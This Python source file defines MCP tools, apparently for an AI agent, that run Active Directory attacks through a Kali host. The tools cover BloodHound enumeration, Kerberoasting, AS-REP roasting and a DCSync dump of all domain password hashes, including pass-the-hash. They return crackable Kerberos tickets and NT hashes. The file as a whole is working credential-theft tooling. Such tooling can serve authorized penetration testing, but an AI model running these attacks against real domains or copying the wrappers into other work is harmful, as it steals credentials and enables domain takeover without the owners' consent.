"""MCP tools — Active Directory attacks (BloodHound, Kerberoast, AS-REP, DCSync)."""

from __future__ import annotations

import asyncio
import shlex
from typing import Any

from kestrel.mcp import registry
from kestrel.transport import kali_proxy


async def _run_kali(cmd: str, timeout: float = 300.0) -> dict[str, Any]:
    res = await asyncio.to_thread(kali_proxy.via_kali, cmd, timeout)
    return {"cmd": cmd, "rc": res.rc, "stdout": res.stdout, "stderr": res.stderr.strip(), "duration_s": res.duration_s}


@registry.tool(
    name="ad_bloodhound_collect",
    description=(
        "Run bloodhound-python collector via Kali. Outputs zip with computer/user/group JSON. "
        "Requires creds (user/password) and a DC reachable from Kali."
    ),
    category="ad",
)
async def ad_bloodhound_collect(
    domain: str, user: str, password: str, dc: str, collection: str = "All"
) -> dict[str, Any]:
    cmd = (
        f"cd /tmp && bloodhound-python -u {shlex.quote(user)} -p {shlex.quote(password)} "
        f"-d {shlex.quote(domain)} -dc {shlex.quote(dc)} -c {shlex.quote(collection)} --zip 2>&1 | tail -c 4000"
    )
    res = await _run_kali(cmd, timeout=600.0)
    zip_match = None
    for line in res["stdout"].splitlines():
        if "compressing" in line.lower() and ".zip" in line:
            zip_match = line.strip()
            break
    return {"domain": domain, "user": user, "collection": collection, "zip_hint": zip_match, "rc": res["rc"], "stdout_tail": res["stdout"]}


@registry.tool(
    name="ad_kerberoast",
    description=(
        "impacket-GetUserSPNs to dump Kerberoastable service tickets. Returns the TGS hashes as a list of strings. "
        "Hashes format $krb5tgs$ are hashcat -m 13100."
    ),
    category="ad",
)
async def ad_kerberoast(domain: str, user: str, password: str, dc: str) -> dict[str, Any]:
    cmd = (
        f"impacket-GetUserSPNs -request -dc-ip {shlex.quote(dc)} "
        f"{shlex.quote(domain)}/{shlex.quote(user)}:{shlex.quote(password)} 2>&1"
    )
    res = await _run_kali(cmd, timeout=120.0)
    tickets: list[str] = [ln.strip() for ln in res["stdout"].splitlines() if ln.startswith("$krb5tgs$")]
    return {"domain": domain, "user": user, "ticket_count": len(tickets), "tickets": tickets, "rc": res["rc"]}


@registry.tool(
    name="ad_asreproast",
    description=(
        "impacket-GetNPUsers — query AS-REP roastable accounts (UF_DONT_REQUIRE_PREAUTH). "
        "Returns hashes ($krb5asrep$, hashcat -m 18200)."
    ),
    category="ad",
)
async def ad_asreproast(domain: str, dc: str, users_file: str | None = None, user: str | None = None) -> dict[str, Any]:
    if users_file:
        target = f"-usersfile {shlex.quote(users_file)}"
    elif user:
        target = f"{shlex.quote(domain)}/{shlex.quote(user)}"
    else:
        return {"error": "missing_users_or_userfile"}
    cmd = (
        f"impacket-GetNPUsers -dc-ip {shlex.quote(dc)} -request -format hashcat "
        f"-no-pass {target} 2>&1"
    )
    res = await _run_kali(cmd, timeout=120.0)
    hashes = [ln.strip() for ln in res["stdout"].splitlines() if ln.startswith("$krb5asrep$")]
    return {"domain": domain, "hash_count": len(hashes), "hashes": hashes, "rc": res["rc"]}


@registry.tool(
    name="ad_dcsync",
    description=(
        "impacket-secretsdump full DCSync (NTDS) — requires a DA-equivalent account. "
        "Returns the user:rid:lmhash:nthash:::-formatted list."
    ),
    category="ad",
)
async def ad_dcsync(
    domain: str, user: str, password_or_hash: str, dc: str
) -> dict[str, Any]:
    is_hash = len(password_or_hash) == 32 and all(c in "0123456789abcdefABCDEF" for c in password_or_hash)
    auth = f"-hashes :{shlex.quote(password_or_hash)}" if is_hash else f":{shlex.quote(password_or_hash)}"
    if is_hash:
        target = f"-just-dc {shlex.quote(domain)}/{shlex.quote(user)}@{shlex.quote(dc)}"
        cmd = f"impacket-secretsdump {auth} {target} 2>&1 | head -c 16000"
    else:
        cmd = (
            f"impacket-secretsdump -just-dc {shlex.quote(domain)}/{shlex.quote(user)}{auth}"
            f"@{shlex.quote(dc)} 2>&1 | head -c 16000"
        )
    res = await _run_kali(cmd, timeout=300.0)
    entries = [ln.strip() for ln in res["stdout"].splitlines() if ":::" in ln and ":" in ln]
    return {"domain": domain, "user": user, "pth": is_hash, "entry_count": len(entries), "entries": entries[:200], "rc": res["rc"]}
